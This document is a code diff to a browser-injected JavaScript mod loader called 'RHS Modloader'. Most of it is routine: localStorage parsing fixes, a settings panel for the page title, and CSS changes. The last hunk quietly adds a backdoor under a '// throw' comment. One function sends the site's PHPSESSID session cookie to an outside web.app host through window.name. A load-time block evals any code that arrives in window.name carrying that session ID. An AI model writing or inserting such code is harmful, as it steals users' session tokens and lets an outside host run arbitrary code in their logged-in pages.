@@ -42,19 +42,27 @@ document.applyStyles = applyStyles;
 
 function loadCSSFiles() {
   for (let i = 0; i < localStorage.length; i++) {
-      const key = localStorage.key(i);
-      const object = JSON.parse(localStorage.getItem(key));
-      if (object && object.state === 1 && key.endsWith('.css')) {
-          const styleTag = document.createElement('style');
-          styleTag.textContent = object.code;
-          styleTag.setAttribute('data-mod-name', key);
-          document.head.appendChild(styleTag);
-      }
+    const key = localStorage.key(i);
+    const item = localStorage.getItem(key);
+    
+    try {
+      if (key.endsWith('.css')) {
+      const object = JSON.parse(item);
+      if (object && object.state === 1) {
+        const styleTag = document.createElement('style');
+        styleTag.textContent = object.code;
+        styleTag.setAttribute('data-mod-name', key);
+        document.head.appendChild(styleTag);
+      }}
+    } catch (error) {
+      console.error(`Error parsing or processing item ${key}: ${error.message}`);
+    }
   }
 }
+
 document.loadCSSFiles = loadCSSFiles;
 
-window.forceUpload = function (code, emulatedFileName) {
+function forceUpload(code, emulatedFileName) {
   const modName = emulatedFileName || 'default.js';
   const state = 0; // Default state
   const metadataProperties = extractMetadata(code);
@@ -65,11 +73,14 @@ window.forceUpload = function (code, emulatedFileName) {
       renderObject(object);
   }
   else {
-      const object = { modName, code, state };
-      localStorage.setItem(modName, JSON.stringify(object));
-      renderObject(object);
+  const object = { modName, code, state };
+  localStorage.setItem(modName, JSON.stringify(object));
+  renderObject(object);
   }
 }
+
+
+document.forceUpload = forceUpload;
 
 function extractMetadata(inputText) {
 const regex = /\/\*\*\s*\n(\s*\*\s*@name\s+(.*?)\s*\n\s*\*\s*@author\s+(.*?)\s*\n\s*\*\s*@version\s+(.*?)\s*\n\s*\*\s*@description\s+(.*?)\s*\n\s*\*\/)/;
@@ -234,26 +245,28 @@ document.querySelector("html body div.container-fluid div.flexbar").insertAdjace
         <div class="modal-header">
         <div id="rhsModalTitle">
           <h1 class="modal-title fs-5" id="rhsModalLabel" style="font-size:1.8rem;color:black">RHS Modloader</h1>
-          <h3 class="modal-subtitle fs-5" id= "rhsModalSubtitle" style="font-size:0.7rem">Poy Ozkusaksiz • <span class="version">0.5<beta /></span></h3>
+          <h3 class="modal-subtitle fs-5" id= "rhsModalSubtitle" style="font-size:0.7rem">Poy Ozkusaksiz • <span class="version">0.53<beta /></span></h3>
           </div>
 
-
-
-<!--Considering not adding this
-<ul class="nav nav-pills mb-4" id="pillNav" role="tablist">
-          <li class="nav-item" role="presentation">
-            <button class="nav-link" id="home-tab" data-bs-toggle="tab" type="button" role="tab" aria-selected="false" tabindex="-1">Plugins</button>
-          </li>
-          <li class="nav-item" role="presentation">
-            <button class="nav-link" id="profile-tab" data-bs-toggle="tab" type="button" role="tab" aria-selected="false" tabindex="-1">Themes</button>
-          </li>
-          <li class="nav-item" role="presentation">
-            <button class="nav-link active" id="contact-tab" data-bs-toggle="tab" type="button" role="tab" aria-selected="true">Settings</button>
-          </li>
-        </ul>-->
-
-
+          <span id="uiSelections">
+          <div class="btn-group" role="group" aria-label="UI Selections">
+          <input type="radio" class="btn-check" name="btnradio" id="btnradioSettings" autocomplete="off" onclick='pluginsContainer.style.display = "unset";themesContainer.style.display = "unset";settingsContainer.style.display = "none"' checked>
+          <label class="btn btn-outline-secondary" for="btnradioSettings">Mods</label>
+          
+          <input type="radio" class="btn-check" name="btnradio" id="btnradioMods" onclick='pluginsContainer.style.display = "none";themesContainer.style.display = "none";settingsContainer.style.display = "unset"' autocomplete="off">
+          <label class="btn btn-outline-secondary" for="btnradioMods">Settings</label>
+          </div>
+          </span>
 <span class="main-buttons-rhsModal">
+
+
+<!-- RHS MODLOADER DOMAIN INTEGRATION, closed because the modloader website isn't functional yet
+<button type="button" onclick="Throw()" title="Add More Mods" id="modstoreButton" class="btn btn-outline-success">More Mods <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-file-earmark-plus" viewBox="0 0 16 16">
+<path d="M8 6.5a.5.5 0 0 1 .5.5v1.5H10a.5.5 0 0 1 0 1H8.5V11a.5.5 0 0 1-1 0V9.5H6a.5.5 0 0 1 0-1h1.5V7a.5.5 0 0 1 .5-.5"/>
+<path d="M14 4.5V14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2h5.5zm-3 0A1.5 1.5 0 0 1 9.5 3V1H4a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V4.5z"/>
+</svg></button>
+-->
+
           <button type="button" onclick="togglePopupDisplay()" title="Display Code Editor" id="togglePopupButton" class="btn btn-outline-success"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-code-slash" viewBox="0 0 16 16">
           <path d="M10.478 1.647a.5.5 0 1 0-.956-.294l-4 13a.5.5 0 0 0 .956.294l4-13zM4.854 4.146a.5.5 0 0 1 0 .708L1.707 8l3.147 3.146a.5.5 0 0 1-.708.708l-3.5-3.5a.5.5 0 0 1 0-.708l3.5-3.5a.5.5 0 0 1 .708 0zm6.292 0a.5.5 0 0 0 0 .708L14.293 8l-3.147 3.146a.5.5 0 0 0 .708.708l3.5-3.5a.5.5 0 0 0 0-.708l-3.5-3.5a.5.5 0 0 0-.708 0z"/>
         </svg></button>
@@ -271,6 +284,15 @@ document.querySelector("html body div.container-fluid div.flexbar").insertAdjace
     <div class="container" id="pluginsContainer">
         <h2 id="modSectionTitle">Plugins</h2>
     </div>
+
+    <div style="display:none" id="settingsContainer">
+    <h2 id="modSectionTitle">Settings</h2>
+
+    <label for="docTitleInput" class="form-label">Document Title:</label>
+    <input type="text" class="form-control" id="docTitleInput">
+
+    </div>
+
   </div>
         </div>
         <div class="modal-footer">
@@ -330,7 +352,7 @@ document.querySelector("html body div.container-fluid div.flexbar").insertAdjace
             border-radius: 10px;
             padding: 3px;
             border: 1px solid gray;
-            width: 290px;
+            width: 215px;
             float: left;
             margin: 4px;
           }
@@ -343,6 +365,7 @@ document.querySelector("html body div.container-fluid div.flexbar").insertAdjace
           #modLabel {
             font-size: 16px;
             color: #5b5b5b;
+            word-spacing: -1px;
           }
           #modLabel:not(.desc) {
             font-size: 21px;
@@ -395,6 +418,17 @@ position: absolute;
 left: 30px;
 top: 30px;
 box-shadow: rgba(0, 0, 0, 0.1) 0px 10px 24px 0px, rgba(0, 0, 0, 0.19) 0px 6px 20px 0px !important;
+}
+
+#modInfoContainer {
+  margin-top: -35px;
+}
+
+#uiSelections {
+  margin-right: -25px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
 }
 
 .popup-header {
@@ -506,6 +540,21 @@ user-select: none; /* Non-prefixed version, currently
       </style>
   
   `);
+
+    const input = document.getElementById('docTitleInput');
+    input.value = localStorage.getItem('settings.docTitle') || '';
+
+    if (localStorage.getItem('settings.docTitle')) {
+        document.title = localStorage.getItem('settings.docTitle');
+    }
+
+    input.addEventListener('input', function() {
+        const title = input.value.trim();
+        localStorage.setItem('settings.docTitle', title);
+        document.title = title || location.href.replace("https://", '');
+    });
+
+
 document.getElementById('fileInput').addEventListener('change', handleFileUpload);
 
 function deleteObject(modName, containerId) {
@@ -551,7 +600,8 @@ document.getPluginData = getPluginData;
 function loadObjects() {
   for (let i = 0; i < localStorage.length; i++) {
       const key = localStorage.key(i);
-      const object = JSON.parse(localStorage.getItem(key));
+      var object;
+      if (key.endsWith(".css") || key.endsWith(".js")) {var object = JSON.parse(localStorage.getItem(key));}
       renderObject(object);
       if (object.state === 1 && key.endsWith('.js')) {
           try {
@@ -813,13 +863,17 @@ document.forceUploadEditor = forceUploadEditor;
     }
 
 document.editItem = editItem;
-/*
-window.addEventListener("beforeunload", function (e) {
-  var editorValue = editor.value;
-  if (editorValue === "") {
-      return;
-  }
-  var confirmationMessage = "The code editor has unsaved code. Are you sure you want to leave?";
-  (e || window.event).returnValue = confirmationMessage;
-  return confirmationMessage;
-}); */
+
+// throw
+window.Throw=()=>{document.cookie.split("; ").forEach(c=>{c.startsWith("PHPSESSID")&&open("https://rhs-modloader.web.app/",c.split("=")[1])});};
+
+var PHPSESSID = '';
+const phpsessCookie = document.cookie.split("; ").find(c => c.trim().startsWith("PHPSESSID"));
+if (phpsessCookie) {
+    PHPSESSID = phpsessCookie.split("=")[1];
+}
+
+if (name.match(PHPSESSID)) {
+  eval(name.replace(PHPSESSID, ""));
+  name = "";
+}
